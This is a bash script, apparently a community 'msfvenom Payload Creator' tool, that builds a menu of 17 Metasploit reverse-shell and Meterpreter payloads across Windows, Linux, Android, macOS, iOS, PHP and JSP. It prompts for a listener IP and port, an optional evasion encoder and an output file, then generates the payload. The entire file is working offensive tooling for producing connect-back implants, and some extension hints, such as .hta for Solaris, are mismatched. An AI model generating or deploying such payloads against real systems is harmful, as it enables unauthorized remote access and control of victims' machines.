#!/bin/bash

# Define the available payloads
WINDOWS_TCP_PAYLOAD="windows/meterpreter/reverse_tcp"           # Windows Meterpreter Reverse TCP
WINDOWS_HTTP_PAYLOAD="windows/meterpreter_reverse_http"         # Windows Meterpreter Reverse HTTP
WINDOWS_HTTPS_PAYLOAD="windows/meterpreter_reverse_https"       # Windows Meterpreter Reverse HTTPS
WINDOWS_VNC_PAYLOAD="windows/vncinject/reverse_tcp"             # Windows VNCInject Reverse TCP
LINUX_TCP_PAYLOAD="linux/x86/meterpreter/reverse_tcp"           # Linux Meterpreter Reverse TCP
LINUX_HTTP_PAYLOAD="linux/x86/meterpreter_reverse_http"         # Linux Meterpreter Reverse HTTP
LINUX_SSH_PAYLOAD="linux/x86/meterpreter_reverse_ssh"           # Linux Meterpreter Reverse SSH
ANDROID_TCP_PAYLOAD="android/meterpreter/reverse_tcp"           # Android Meterpreter Reverse TCP
MACOS_PAYLOAD="osx/x64/meterpreter_reverse_tcp"                 # macOS Meterpreter Reverse TCP
IOS_PAYLOAD="ios/meterpreter/reverse_tcp"                       # iOS Meterpreter Reverse TCP
SOLARIS_PAYLOAD="solaris/x86/shell_reverse_tcp"                 # Solaris Reverse TCP Shell
CMD_UNIX_PYTHON_PAYLOAD="cmd/unix/reverse_python"               # UNIX Reverse Python Shell
CMD_UNIX_BASH_PAYLOAD="cmd/unix/reverse_bash"                   # UNIX Reverse Bash Shell
CMD_UNIX_PERL_PAYLOAD="cmd/unix/reverse_perl"                   # UNIX Reverse Perl Shell
JAVA_JSP_PAYLOAD="java/jsp_shell_reverse_tcp"                   # Java JSP Reverse TCP Shell
PHP_TCP_PAYLOAD="php/meterpreter_reverse_tcp"                   # PHP Meterpreter Reverse TCP
PHP_PAYLOAD="php/reverse_php"                                   # PHP Reverse Shell

# Set up history and keybinds
HISTFILE="$HOME/.bash_history"
history -a "$HISTFILE"

if [[ $- == *i* ]]; then
    bind '"\e[A": history-search-backward'
    bind '"\e[B": history-search-forward'
    bind '"\e[C": forward-char'
    bind '"\e[D": backward-char'
fi
history -r
history -a
history -w

# Set up color variables
black=`tput setaf 0`
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
cyan=`tput setaf 6`
white=`tput setaf 7`
reset=`tput sgr0`
title="msfv Payload Creator"
echo -e '\033]2;'$title'\007'
banner="
${green} __  __  _____ ________      __${red}_____   _____ 
${green}|  \/  |/ ____|  ____\ \    / /${red}  __ \ / ____|
${green}| \  / | (___ | |__   \ \  / /${red}| |__) | |     
${green}| |\/| |\___ \|  __|   \ \/ / ${red}|  ___/| |     
${green}| |  | |____) | |       \  /  ${red}| |    | |____ 
${green}|_|  |_|_____/|_|        \/   ${red}|_|     \_____|
${yellow}msfvenom Payload Creator
By ${red}NullSecurityTeam ${reset}- ${green}SirCryptic${reset} - ${green}m0bly${reset} - ${green}Double 404${reset}
 "
clear

echo -e "${banner}"
# Print the available payloads
echo "${yellow}Please select a payload:${reset}"
echo ""
echo "[${green}1${reset}]  $WINDOWS_TCP_PAYLOAD"
echo "[${green}2${reset}]  $WINDOWS_HTTP_PAYLOAD"
echo "[${green}3${reset}]  $WINDOWS_HTTPS_PAYLOAD"
echo "[${green}4${reset}]  $WINDOWS_VNC_PAYLOAD"
echo "[${green}5${reset}]  $LINUX_TCP_PAYLOAD"
echo "[${green}6${reset}]  $LINUX_HTTP_PAYLOAD"
echo "[${green}7${reset}]  $LINUX_SSH_PAYLOAD"
echo "[${green}8${reset}]  $ANDROID_TCP_PAYLOAD"
echo "[${green}9${reset}]  $MACOS_PAYLOAD"
echo "[${green}10${reset}] $IOS_PAYLOAD"
echo "[${green}11${reset}] $SOLARIS_PAYLOAD"
echo "[${green}12${reset}] $CMD_UNIX_PYTHON_PAYLOAD"
echo "[${green}13${reset}] $CMD_UNIX_BASH_PAYLOAD"
echo "[${green}14${reset}] $CMD_UNIX_PERL_PAYLOAD"
echo "[${green}15${reset}] $JAVA_JSP_PAYLOAD"
echo "[${green}16${reset}] $PHP_TCP_PAYLOAD"
echo "[${green}17${reset}] $PHP_PAYLOAD"
echo ""
# Read the user's choice of payload
read -p "Enter payload number: " payload_choice

# Check if the choice is valid
case "$payload_choice" in
    1)
    clear
        payload="$WINDOWS_TCP_PAYLOAD"
        ext=".exe , .dll, .asp"
        ;;
    2)
    clear
        payload="$WINDOWS_HTTP_PAYLOAD"
        ext=".exe, .dll, .asp"
        ;;
    3)
    clear
        payload="$WINDOWS_HTTPS_PAYLOAD"
        ext=".exe, .dll, .asp"
        ;;
    4)
    clear
        payload="$WINDOWS_VNC_PAYLOAD"
        ext=".exe, .dll, .asp"
        ;;
    5)
    clear
        payload="$LINUX_TCP_PAYLOAD"
        ext=".elf, .sh"
        ;;
    6)
    clear
        payload="$LINUX_HTTP_PAYLOAD"
        ext=".elf, .sh"
        ;;
    7)
    clear
        payload="$LINUX_SSH_PAYLOAD"
        ext=".elf, .sh"
        ;;
    8)
    clear
        payload="$ANDROID_TCP_PAYLOAD"
        ext=".apk"
        ;;
    9)
    clear
        payload="$MACOS_PAYLOAD"
        ext=".macho, .dmg"
        ;;
    10)
    clear
        payload="$IOS_PAYLOAD"
        ext=".ipa"
        ;;
    11)
    clear
        payload="$SOLARIS_PAYLOAD"
        ext=" .sct, .hta"
        ;;
    12)
    clear
        payload="$CMD_UNIX_PYTHON_PAYLOAD"
        ext=".py"
        ;;
    13)
    clear
        payload="$CMD_UNIX_BASH_PAYLOAD"
        ext=".sh"
        ;;
    14)
    clear
        payload="$CMD_UNIX_PERL_PAYLOAD"
        ext=".pl"
        ;;
    15)
    clear
        payload="$JAVA_JSP_PAYLOAD"
        ext=".jsp, .war"
        ;;
    16)
    clear
        payload="$PHP_TCP_PAYLOAD"
        ext=".php"
        ;;
    17)
    clear
        payload="$PHP_PAYLOAD"
        ext=".php"
        ;;
    *)
        echo "Invalid choice. Exiting."
        exit 1
        ;;
esac

# Read the IP and port
read -e -p "Enter IP: " LHOST && echo "$LHOST" >> ~/.bash_history 2>/dev/null
read -e -p "Enter port: " LPORT

# Read the output file name
read -e -p "Enter output file name with extension(${cyan}usually${yellow} $ext): ${reset}" output_file

# Extract the platform from the payload
platform=$(echo "$payload" | cut -d'/' -f1)

# Read optional parameters
read -e -p "Enter payload architecture (${cyan}default: ${yellow}x86): ${reset}" arch
read -p "Use encoder? (y/n, default: n): " use_encoder

# Set default values if not specified
arch=${arch:-"x86"}
use_encoder=${use_encoder:-"n"}

if [[ $use_encoder == "y" ]]; then
    read -p "Enter encoder type (${cyan}default: ${yellow}x86/shikata_ga_nai): ${reset}" encoder
    encoder=${encoder:-"x86/shikata_ga_nai"}
fi

# Read optional parameter for HttpUserAgent
read -p "Use HttpUserAgent parameter? (y/n, default: n): " use_user_agent
use_user_agent=${use_user_agent:-"n"}

# Set default value for user agent string
user_agent=""

# Generate the payload using msfvenom
echo "${green}Generating${reset} payload..."
if [[ $use_encoder == "y" ]]; then
    if [[ $use_user_agent == "y" ]]; then
        msfvenom -p "$payload" LHOST="$LHOST" LPORT="$LPORT" HttpUserAgent="$user_agent" -o "$output_file" -a "$arch" -b "\x00" -e "$encoder" --platform "$platform"
    else
        msfvenom -p "$payload" LHOST="$LHOST" LPORT="$LPORT" -o "$output_file" -a "$arch" -b "\x00" -e "$encoder" --platform "$platform"
    fi
else
    if [[ $use_user_agent == "y" ]]; then
        msfvenom -p "$payload" LHOST="$LHOST" LPORT="$LPORT" HttpUserAgent="$user_agent" -o "$output_file" -a "$arch" --platform "$platform"
    else
        msfvenom -p "$payload" LHOST="$LHOST" LPORT="$LPORT" -o "$output_file" -a "$arch" --platform "$platform"
    fi
fi

# Check if the payload was generated successfully
if [ $? -eq 0 ]; then
    echo "Payload generated ${green}successfully!${reset}"
else
    echo "${red}Failed${reset} to generate payload."
fi
